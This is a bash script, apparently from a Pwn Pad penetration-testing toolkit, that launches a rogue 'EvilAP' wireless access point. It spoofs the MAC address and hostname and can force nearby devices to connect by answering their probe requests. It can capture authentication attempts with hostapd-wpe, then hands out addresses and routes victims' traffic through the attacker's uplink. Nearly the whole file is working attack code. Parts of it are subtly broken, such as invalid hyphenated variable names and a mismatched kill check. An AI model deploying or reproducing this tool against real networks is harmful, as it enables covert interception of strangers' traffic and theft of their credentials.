#!/bin/bash
# Desc: EvilAP script to forcefully connect wireless clients
#set the prompt to the name of the script
PS1=${PS1//@\\h/@evilap}
clear

#this block controls the features for px_interface_selector
include_null=1
include_extwifi=0
include_monitor=0
include_airbase=0
include_cell=1
include_usb=0 #the computer thinks we are sharing internet, not the other way
#this interface selection is for the uplink, attack always uses external wifi
default_interface=gsm_int
message="be used for Internet uplink"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

f_endclean(){
  printf "\n[-] Exiting...\n"
  f_restore_ident
  f_clean_up
  EXIT_NOW=1
}

f_clean_up(){
  printf "[-] Killing any instances of evilap and dhcpd\n"
  [ -n "${airbase-ng-pid}" ] && kill ${airbase-ng-pid} > /dev/null 2>&1
  [ -n "${airbase-ng-pid}" ] && kill ${hostapd-wpe-pid} > /dev/null 2>&1
  [ -n "${dhcpd-pid}" ] && kill ${dhcpd-pid} > /dev/null 2>&1
  [ "${evilap_type}" = "airbase-ng" ] && f_mon_disable
  ${iptables_command1/A/D}
  #remember rule 2 is special, removes at start and re-adds at cleanup
  ${iptables_command2/D/A}
  [ -n "${ip_command1}" ] && ${ip_command1/add/del}
  [ -n "${ip_command2}" ] && ${ip_command2/add/del}
  [ -n "${ip_command3}" ] && ${ip_command3/add/del}
}

f_restore_ident(){
  printf "[+] Restoring network identity\n"
  hostn=$(cat /etc/hostname)
  ifconfig "${evilap_interface}" down &> /dev/null
  macchanger -p "${evilap_interface}" &> /dev/null
  hostname "$hostn"
}

f_banner(){
  printf "\n[+] Welcome to EvilAP\n\n"
}

f_ssid(){
  clear
  printf "\n[+] Enter an SSID name\n"
  printf "[-] Default SSID: [Public_Wireless]\n\n"
  read -p "SSID: " ssid

  if [ -z $ssid ]; then
    ssid=Public_Wireless
  fi
}

f_channel(){
  clear
  [ -n "$channel" ] && printf "\nChannel $channel is ${1:-invalid}.\n"
  printf "\n[+] Please enter a channel to run EvilAP on (Default: 1).\n\n"
  [ -n "${twofour_channels}" ] && printf "Available 2.4 GHz channels are: ${twofour_channels}\n"
  [ -n "${five_channels}" ] && printf "Available 5 GHz channels are: ${five_channels}\n"
  printf "\n"

  unset channel
  read -p "Channel: " channel

  [ -z "$channel" ] && channel=1
  f_validate_channel wlan1mon $channel
  RETCODE=$?
  case $RETCODE in
    0) return 0 ;;
    2) f_channel "not in the supported channel list" ;;
    3) f_channel "not supported in the current regulatory domain" ;;
    *) f_channel ;;
  esac
  return 1
}

f_beacon_rate(){
  [ "${evilap_type}" != "airbase-ng" ] && return 0
  clear
  printf "\n[+] Enter the beacon rate at which to broadcast probe requests:\n\n"
  printf "[!] If clients don't stay connected try changing this value\n\n"
  printf "[-] Default is: [30]\n\n"
  read -p "Range [20-70]: " brate

  if [ -z $brate ]; then
    brate=30
  fi
}

f_preplaunch(){
  #Change the hostname and mac address randomly
  printf "\n[+] Rolling MAC address and hostname randomly\n\n"

  #interface is already in monitor mode
  ifconfig wlan1mon down
  if [ "${evilap_type}" = "hostapd" ]; then
    airmon-ng stop wlan1mon > /dev/null 2>&1
    sleep 1
    ifconfig wlan1 down
  fi
  sleep 1
  macchanger -r "${evilap_interface}"
  hn=$(macchanger --show "${evilap_interface}" | grep "Current" | awk '{print $3}' |awk -F":" '{print$1$2$3$4$5$6}')
  hostname "$hn"
  printf "[+] New hostname set: $hn\n"
  ifconfig "${evilap_interface}"

  mkdir /dev/net/ &> /dev/null
  ln -s /dev/tun /dev/net/tun &> /dev/null
  if iptables --table nat -L 2>&1 | grep -q MASQUERADE; then
    printf "It looks like some kind of tethering is already enabled.\n"
    printf "Please disable tethering before attempting to run evilap.\n"
    f_endclean
  fi
}

f_logname(){
  printf "/opt/pwnix/captures/wireless/evilap-$(date +%s).log\n"
}

f_evilap_type(){
  if [ -x /usr/sbin/hostapd-wpe ]; then
    evilap_type="hostapd"
    evilap_interface="wlan1"
    evilap_eth="wlan1"
  else
    evilap_type="airbase-ng"
    evilap_interface="wlan1mon"
    evilap_eth="at0"
  fi
}

f_karmaornot(){
  clear
  printf "\n[?] Force clients to connect with their probe requests?\n\n"
  printf "[!] Everything will start connecting to you if YES is selected!\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"
  read -p "Choice [1-2]: " karma
  case $karma in
    1)
      printf "[+] Starting EvilAP with forced connection attack\n"
      f_beacon_rate
      airbase_flags="-P -C $brate"
      hostap_flags="-s -k"
      ;;
    2)
      printf "[+] Starting EvilAP without forced connection attack\n"
      airbase_flags=""
      hostap_flags=""
      ;;
    *) f_karmaornot ;;
  esac

  f_preplaunch

  #Log path and name
  logname=$(f_logname)
  printf "[+] Creating new logfile: $logname\n"

  trap f_endclean INT

  #Start evilap
  if [ "${evilap_type}" = "airbase-ng" ]; then
    airbase-ng $airbase_flags -c $channel -e "$ssid" -v wlan1mon > "$logname" 2>&1 &
    airbase-ng-pid="$!"
  elif [ "${evilap_type}" = "hostapd" ]; then
    hostapd_conf=$(mktemp -t hostapd.conf-XXXX)
    printf "interface=wlan1\nssid=$ssid\nchannel=$channel\n" > "${hostapd_conf}"
    hostapd-wpe $hostap_flags -dd -t "${hostapd_conf}" 2>&1 | grep --line-buffered --color=never \
      -E "(WPE|deauthenticat|authentication|association|dissassociation)" > "${logname}" &
    hostapd-wpe-pid="$!"
  fi
  sleep 2

  #Bring up interface
  ifconfig "${evilap_eth}" up 192.168.7.1 netmask 255.255.255.0

  #Start DHCP server on ${evilap_eth}
  if [ -d /var/lib/dhcp ] && [ ! -f /var/lib/dhcp/dhcpd.leases ]; then
    touch /var/lib/dhcp/dhcpd.leases
  fi
  dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid "${evilap_eth}"
  sleep 1
  dhcpd-pid="$(cat /var/run/dhcpd.pid)"

  if [ -n "${interface}" ]; then
    #IP forwarding and iptables routing using internet connection
    printf 1 > /proc/sys/net/ipv4/ip_forward
    android_vers=$(/system/bin/getprop ro.build.version.release)
    case ${android_vers%%.*} in
      5) iptables_command1="iptables -t nat -A natctrl_nat_POSTROUTING -o ${interface} -j MASQUERADE"
         iptables_command2="iptables -D natctrl_FORWARD -j DROP"
         ip_command1="ip route add 192.168.7.0/24 dev ${evilap_eth} scope link table local_network"
         ip_command2="ip rule add from all iif ${evilap_eth} lookup ${interface} pref 18000"
         ip_command3="ip rule add from all oif ${evilap_eth} lookup local_network pref 14000" ;;

      *) iptables_command1="iptables -t nat -A POSTROUTING -o ${interface} -j MASQUERADE" ;;
    esac
    #hack ip route table name, remove this when bootpwn is updated
    if ! grep -q local_network /etc/iproute2/rt_tables; then
      if ! grep -q 97 /etc/iproute2/rt_tables; then
        printf "97 local_network\n" > /etc/iproute2/rt_tables
      fi
    fi

    [ -n "${ip_command1}" ] && ${ip_command1}
    [ -n "${ip_command2}" ] && ${ip_command2}
    [ -n "${ip_command3}" ] && ${ip_command3}
    ${iptables_command1}
    ${iptables_command2}
  fi

  tail -f "$logname"
}

f_mon_enable
if [ "$?" = "0" ]; then
  EXIT_NOW=0
  [ "$EXIT_NOW" = 0 ] && f_banner
  [ "$EXIT_NOW" = 0 ] && require_ip=1 f_interface
  [ "$EXIT_NOW" = 0 ] && f_ssid
  [ "$EXIT_NOW" = 0 ] && f_channel_list wlan1mon
  [ "$EXIT_NOW" = 0 ] && f_channel
  [ "$EXIT_NOW" = 0 ] && f_evilap_type
  [ "$EXIT_NOW" = 0 ] && f_karmaornot
  [ "$EXIT_NOW" = 0 ] && f_endclean
fi
